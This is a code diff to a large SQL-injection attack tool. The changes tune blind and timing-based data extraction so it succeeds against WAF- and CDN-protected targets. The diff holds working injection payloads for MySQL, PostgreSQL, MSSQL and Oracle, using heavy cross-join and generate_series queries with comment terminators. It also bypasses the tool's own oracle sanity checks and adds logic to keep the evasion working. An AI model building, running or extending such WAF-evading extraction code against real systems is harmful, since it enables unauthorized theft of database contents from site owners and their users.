@@ -47592,30 +47592,44 @@ class Enumerator:
         if not _eval_fn and hasattr(self, "_mse_instance") and self._mse_instance:
             _bool_oracle = getattr(self._mse_instance, '_boolean_oracle', None)
             if _bool_oracle:
-                # BUG-MSE-BOOL-ORACLE-SANITY FIX: validate oracle before extraction use.
-                # A stale/detection-phase oracle (calibrated on 1=1/1=2 SimHash probes)
-                # evaluates extraction SQL against a WAF challenge page → coin-flip True/False
-                # → garbage bits → garbage chars. Validate here to reject broken oracles.
-                try:
-                    _san_true = await _bool_oracle("1=1")
-                    _san_false = await _bool_oracle("1=2")
-                    # FIX-BUG3: Proper oracle sanity check:
-                    # - `is True`/`is False` fails for numpy.bool_, integer 1/0, or any
-                    #   non-singleton True/False returned by oracle wrappers.
-                    # - None means "no result / indeterminate" (WAF block, timeout) — treat
-                    #   as inconclusive: if 1=1 returns None, oracle is unreachable; if 1=2
-                    #   returns None, oracle may still work (false condition blocked by WAF
-                    #   is ambiguous — could be oracle not seeing it, or true condition only).
-                    # Accept only when: 1=1 is truthy (not None, not False) AND 1=2 is
-                    # explicitly falsy (False or 0, but NOT None which is indeterminate).
-                    if (_san_true is not None and _san_false is not None
-                            and bool(_san_true) and not bool(_san_false)):
-                        _eval_fn = _bool_oracle
-                        _oracle_name = "mse_boolean"
-                    else:
-                        LOG.warning("[_extract_str] mse_boolean oracle failed sanity (1=1→%r, 1=2→%r); discarding", _san_true, _san_false)
-                except Exception as _osan_e:
-                    LOG.warning("[_extract_str] mse_boolean oracle sanity raised: %s; discarding", _osan_e)
+                # BUG-V25-SANITY-BYPASS FIX (CRITICAL): When the oracle is a V25-wired
+                # TIMING oracle (_boolean_oracle_is_timing=True), skip the boolean sanity
+                # check (1=1→True, 1=2→False). Timing oracles CANNOT pass this check:
+                # both 1=1 and 1=2 produce a fast response when the CDN caches the probe
+                # (no sleep executed → elapsed < threshold → returns False). The check
+                # was discarding the only working oracle for every WAF+CDN-protected target.
+                # The V25 wiring code already validated the timing signal before wiring,
+                # so we can trust this oracle without an additional sanity probe.
+                _oracle_is_timing = getattr(self._mse_instance, '_boolean_oracle_is_timing', False)
+                if _oracle_is_timing:
+                    _eval_fn = _bool_oracle
+                    _oracle_name = "mse_timing_oracle"
+                    LOG.info("[_extract_str] using V25-wired timing oracle directly (skipping boolean sanity — timing oracles fail 1=1/1=2 check on CDN targets)")
+                else:
+                    # BUG-MSE-BOOL-ORACLE-SANITY FIX: validate oracle before extraction use.
+                    # A stale/detection-phase oracle (calibrated on 1=1/1=2 SimHash probes)
+                    # evaluates extraction SQL against a WAF challenge page → coin-flip True/False
+                    # → garbage bits → garbage chars. Validate here to reject broken oracles.
+                    try:
+                        _san_true = await _bool_oracle("1=1")
+                        _san_false = await _bool_oracle("1=2")
+                        # FIX-BUG3: Proper oracle sanity check:
+                        # - `is True`/`is False` fails for numpy.bool_, integer 1/0, or any
+                        #   non-singleton True/False returned by oracle wrappers.
+                        # - None means "no result / indeterminate" (WAF block, timeout) — treat
+                        #   as inconclusive: if 1=1 returns None, oracle is unreachable; if 1=2
+                        #   returns None, oracle may still work (false condition blocked by WAF
+                        #   is ambiguous — could be oracle not seeing it, or true condition only).
+                        # Accept only when: 1=1 is truthy (not None, not False) AND 1=2 is
+                        # explicitly falsy (False or 0, but NOT None which is indeterminate).
+                        if (_san_true is not None and _san_false is not None
+                                and bool(_san_true) and not bool(_san_false)):
+                            _eval_fn = _bool_oracle
+                            _oracle_name = "mse_boolean"
+                        else:
+                            LOG.warning("[_extract_str] mse_boolean oracle failed sanity (1=1→%r, 1=2→%r); discarding", _san_true, _san_false)
+                    except Exception as _osan_e:
+                        LOG.warning("[_extract_str] mse_boolean oracle sanity raised: %s; discarding", _osan_e)
         
         if not _eval_fn:
             # BUG-EXTR-1 FIX: Before giving up, attempt self-calibration of a
@@ -107069,8 +107083,13 @@ class TechniqueCascadeEngine:
             elif hasattr(baseline, "status_code"):
                 _bl_status = baseline.status_code
         _bl_size = len(norm_base) if norm_base else 0
-        # FIX: Increased threshold from 10KB to 100KB for modern error pages with frameworks
-        _is_error_page = _bl_status >= 400 and _bl_size < 100000
+        # _is_error_page is True only when the clean baseline probe returned a genuine
+        # application error, NOT when the WAF itself blocked the probe (which also returns
+        # 4xx but with a tiny WAF-challenge body that doesn't represent the page).
+        # Guard: when all Check A canaries are WAF-blocked, the 4xx baseline is WAF-forced,
+        # so treat the page as live (not an error page) regardless of status/size.
+        _waf_forced_clean_block = _check_a_all_waf_blocked and _bl_status in range(400, 600)
+        _is_error_page = _bl_status >= 400 and _bl_size < 100000 and not _waf_forced_clean_block
         
         if _a_strong:
             if tech in ("S", "HQ", "DS"):
@@ -107279,12 +107298,16 @@ class TechniqueCascadeEngine:
         #   3. Not an error page: error pages are dynamic; diff is unreliable.
         #   4. All canaries truly WAF-blocked (not just low-gap), confirmed by
         #      WAFBlockDiscriminator.is_waf_block on both legs of every pair.
+        # When all Check A canaries are WAF-blocked the WAF also returns 4xx for the clean
+        # baseline probe, making _bl_status=4xx and _is_error_page=True even for live pages.
+        # Drop both guards in that case; the direct_sim≥0.88 threshold below is the FP wall.
+        _waf_skewed_baseline = _check_a_all_waf_blocked and _bl_status in range(400, 600)
         if (_e_pass
                 and _check_a_all_waf_blocked
                 and not _a_pass  # redundant safety: only fire when Check A genuinely failed
                 and tech not in ("S", "HQ", "T", "BT", "TH", "DS")
-                and not _is_error_page
-                and _bl_status not in range(400, 600)):
+                and (not _is_error_page or _waf_skewed_baseline)
+                and (_bl_status not in range(400, 600) or _waf_skewed_baseline)):
             # Raise threshold for standalone Check E: 0.88 > 0.80 (normal Check E floor)
             try:
                 _e_direct_sim_val = float(_details.get("E", "direct_sim=0").split("direct_sim=")[1].split(" ")[0])
@@ -114182,7 +114205,7 @@ class TechniqueCascadeEngine:
                     if ('GENERATE_SERIES' in payload.upper() or 'RANDOMBLOB' in payload.upper()) and _hq_sl_v > 1000:
                         _hq_sl_v = _hq_sl_v / 10_000_000  # rough seconds
                     time_threshold = _hq_mean_b + max(
-                        _hq_sl_v * 1000 * 0.50,
+                        _hq_sl_v * 1000 * 0.75,
                         # BUG-HQ-THRESHOLD-HIGH-JITTER FIX: With HIGH_JITTER cv=0.89 and
                         # baseline=200ms, std≈178ms. The old std×1.5 = 75ms floor gives a
                         # threshold of only 320ms — well inside the natural jitter envelope
@@ -114561,8 +114584,8 @@ class TechniqueCascadeEngine:
                         _th_sl_v = float(_th_raw)
                         _th_std = max(baseline.get("std_timing", 50)
                                       if isinstance(baseline, dict) else 50, 50)
-                        time_threshold = _th_mean + max(_th_sl_v * 1000 * 0.50,
-                                                        _th_std * 1.5)
+                        time_threshold = _th_mean + max(_th_sl_v * 1000 * 0.75,
+                                                        _th_std * 3.0)
                 # FIX-BUG5: Raised 1.3× to 1.8× — CDN edge nodes return ~320ms for blocked
                 # probes; 200ms × 1.3 = 260ms wrongly classified CDN blocks as non-WAF.
                 # 200ms × 1.8 = 360ms correctly captures CDN-routed WAF blocks up to ~360ms.
@@ -118696,7 +118719,7 @@ class UniversalScanOrchestrator:
                                                             # HQ: heavy cross-join (WAF-safe: no SLEEP keyword)
                                                             _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
                                                                     f"information_schema.tables a,information_schema.tables b "
-                                                                    f"WHERE ({_cond}))>=0-- -")
+                                                                    f"WHERE ({_cond})) IS NOT NULL-- -")
                                                         else:
                                                             _pay = f"{_o}{_ipfx} AND IF({_cond},SLEEP({_ts}),0)-- -"
                                                     elif _db in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift'):
@@ -118719,7 +118742,7 @@ class UniversalScanOrchestrator:
                                                             _hq_rows = max(1000000, min(int(_ts * 1000000), 8000000))
                                                             _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
                                                                     f"generate_series(1,CASE WHEN ({_cond}) "
-                                                                    f"THEN {_hq_rows} ELSE 1 END))>0-- -")
+                                                                    f"THEN {_hq_rows} ELSE 1 END)) IS NOT NULL-- -")
                                                         else:
                                                             _pay = f"{_o}{_ipfx} AND (CASE WHEN ({_cond}) THEN (SELECT CAST(pg_sleep({_ts}) AS TEXT)) ELSE (SELECT CAST(pg_sleep(0) AS TEXT)) END) IS NOT NULL-- -"
                                                     elif _db in ('MSSQL', 'Sybase'):
@@ -118737,7 +118760,7 @@ class UniversalScanOrchestrator:
                                                         # FALSE branch: WAITFOR '0:0:0' → instant response.
                                                         _pay = (f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) "
                                                                            "THEN (SELECT COUNT(*) FROM sys.all_columns A CROSS JOIN (SELECT TOP 100 object_id FROM sys.all_columns) B WHERE A.object_id IS NOT NULL) "
-                                                                           "ELSE CAST(0 AS INT) END)>0-- -")  # FIX-MSSQL-TIMING-CANARY: 2-way join (safer than 3-way)
+                                                                           "ELSE CAST(0 AS INT) END) IS NOT NULL-- -")  # FIX-MSSQL-TIMING-CANARY: 2-way join (safer than 3-way)
                                                     elif _db == 'Oracle':
                                                         # BUG-ORACLE-1 FIX: DBMS_SESSION.SLEEP is a PL/SQL
                                                         # PROCEDURE (returns void/NULL).  Using it as a
@@ -118751,7 +118774,7 @@ class UniversalScanOrchestrator:
                                                         # RECEIVE_MESSAGE times out after _ts seconds (returns 1).
                                                         # True branch: sleeps _ts seconds → slow response.
                                                         # False branch: 0 → fast response.
-                                                        _pay = f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500000) ELSE 0 END FROM DUAL)>=0-- -"  # FIX-18: heavy-query (DBMS_PIPE needs EXECUTE privilege not granted to PUBLIC)
+                                                        _pay = f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500000) ELSE 0 END FROM DUAL) IS NOT NULL-- -"  # FIX-18: heavy-query (DBMS_PIPE needs EXECUTE privilege not granted to PUBLIC)
                                                     elif _db == 'SQLite':
                                                         # BUG-SQLITE-TIMING-1 FIX: `_iters = 300_000_000 if _cond else 1`
                                                         # evaluates _cond as a Python truthy/falsy value. _cond is a SQL
@@ -118844,6 +118867,12 @@ class UniversalScanOrchestrator:
                                                     _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                 _enum._mse_instance = _FakeMSE2()
                                             _enum._mse_instance._boolean_oracle = _inline_timing_oracle
+                                            # BUG-V25-ORACLE-CLEARED FIX: Mark this oracle as a timing
+                                            # oracle so MSE.calibrate() does NOT clear it at line 130398.
+                                            # Without this flag, calibrate() always set _boolean_oracle=None
+                                            # after strategy testing failed, discarding the V25 oracle and
+                                            # leaving _extract_str with no working oracle → empty extraction.
+                                            _enum._mse_instance._boolean_oracle_is_timing = True
                                             print("[+] [V25-Extract] Inline timing oracle wired "
                                                   f"(tech={_det_tech!r}, sleep={_timing_sleep_s}s) — "
                                                   "extraction can proceed despite oracle calibration failure",
@@ -130395,7 +130424,19 @@ class MultiStrategyExtractor:
         ]
         self._oracles = []
         self._oracle_fns = {}
-        self._boolean_oracle = None  # BUG-MSE-STALE-BOOL-ORACLE FIX: clear any externally-wired oracle so 0-working-oracle case doesn't leak stale coin-flip SimHash oracle into extraction
+        # BUG-MSE-STALE-BOOL-ORACLE FIX: clear stale coin-flip SimHash oracle that was set
+        # during detection but is useless for extraction (it compares body hashes from the
+        # detection phase against the baseline, which is often a WAF challenge page).
+        # BUG-V25-ORACLE-CLEARED FIX (CRITICAL): Do NOT clear when the oracle was externally
+        # wired by V25 as a TIMING oracle (_boolean_oracle_is_timing=True). V25 wires a
+        # cache-busting inline timing oracle BEFORE calibrate() is called. Previously,
+        # calibrate() always cleared _boolean_oracle here, discarding the V25-wired timing
+        # oracle. Result: _extract_str's step 3 (MSE boolean oracle) always found
+        # _boolean_oracle=None and fell through to the timing fallback which strips comment-
+        # based bypass from the detection payload → WAF blocks every probe → "" returned.
+        # Fix: only clear when not marked as a timing oracle.
+        if not getattr(self, '_boolean_oracle_is_timing', False):
+            self._boolean_oracle = None
 
         # BUG-MSE-NO-BOOL-ORACLE FIX: When detection technique is boolean (B/BH/IN/BT),
         # the body-size difference oracle is already confirmed (e.g. TRUE=557B, FALSE=155B).
